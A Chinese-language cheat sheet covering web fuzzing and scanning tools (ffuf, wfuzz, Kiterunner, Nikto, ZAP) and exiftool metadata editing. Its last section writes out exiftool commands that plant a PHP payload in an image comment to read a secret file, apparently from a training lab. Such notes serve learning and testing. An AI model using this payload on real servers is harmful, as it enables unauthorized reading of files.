### web

#### ffuf - 模糊测试

- 用法：在爆破位置设置 FUZZ 关键字
- `-w 字典路径`
- `-u URL地址/FUZZ` 目录发现

#### wfuzz

[文档](https://wfuzz.readthedocs.io/en/latest/)

- `-w wordlist.txt`
    指定字典
- `-f outfile.txt`
    指定输出文件位置
- `--hc 404`
    排除任何具有404状态码的响应
- `--follow`
    追踪 HTTP重定向

- `-H 头部字段: 头部值`
    指定自定义头

- 注入点标记
    - 使用`FUZZ`、`FUZ2Z`、`FUZ3Z`等标记不同的注入点。这些注入点将分别用传入的第一个、第二个和第三个单词列表进行模糊测试。

- `--basic`
    基本身份验证

- `-v`
    显示详细内容

- `--filter`
    设置结果过滤器
    - `content~STRING`
        按内容字符串过滤

`-d 参数名=参数值`
    指定POST请求体数据

#### Kiterunner

[KiteRunner](https://github.com/assetnote/kiterunner) 是一个在现代应用程序和 API 中执行传统内容发现和暴力破解路由/端点的工具。

```sh
kr [scan|brute] <input> [flags]
```

要使用单词列表扫描目标的 API，我们可以：

```sh
kr scan https://example.com/api -w /usr/share/wordlists/apis/routes-large.kite --fail-status-codes 404,403
```

#### Nikto - 扫描器

- 程序路径 `/nikto/program/nikto.pl`
- `-output 导出文件` 
- `-host URL地址`

- `-Tuning -扫描调优选项` 设置扫描类型

    ```log
    1     有趣的文件 / 在日志中出现过
    2     错误配置 / 默认文件
    3     信息泄露

    5     远程文件获取 - Web 根目录内
    6     拒绝服务
    7     远程文件获取 - 服务器范围

    9     SQL 注入
    0     文件上传
    a     认证绕过
    b     软件识别
    c     远程源包含
    d     Web 服务
    e     管理控制台
    x     反向调优选项（即包含除指定项外的所有）
    ```



#### Zap

安装
1. [Zap 下载](https://www.zaproxy.org/download/)

设置
- 工具 - 选项 - 显示 - 外观
    - 选择字体“微软雅黑”，设置字体大小16
    - 使用暗色 UI：选择 Flat Dark
    - `显示-最大化左边的标签` 或 `最大化底部标签` 同时显示历史记录与请求
    - `响应面板位置-面板并排` 同时显示请求与响应

使用
- [官网文档](https://www.zaproxy.org/docs)
    - 拥有 Burp 到 Zap 的[功能映射专题](https://www.zaproxy.org/docs/burp-to-zap-feature-map/)

        对于 Firefox，在安装附加组件页面的蓝色按钮即为扩展的文件地址，保存到本地后添加到 `Selenium` 的浏览器扩展功能中
- :warning: 插件“沉浸式翻译”的划词翻译功能在内置浏览器中不可用，而在 Zap 为代理的浏览器中可用

### 文件元数据

#### exiftool

https://exiftool.sourceforge.net/exiftool_pod.html


Tag operations
- `-TAG[+-]<=DATFILE`
    Write tag value from contents of file

- `-TAG[+-^]=[VALUE]`
    Write a new value for the specified tag (eg. -comment=wow), or delete the tag if no VALUE is given (eg. -comment=).

Processing control
- `-o OUTFILE  (-out)`


```bash
exiftool fruit.jpg -o payload_img.php -comment="<?php echo  'AAA' . file_get_contents('/home/carlos/secret') . 'ZZZ'; ?>"

exiftool fruit.jpg -o payload_img.php -comment<="input.php"
```
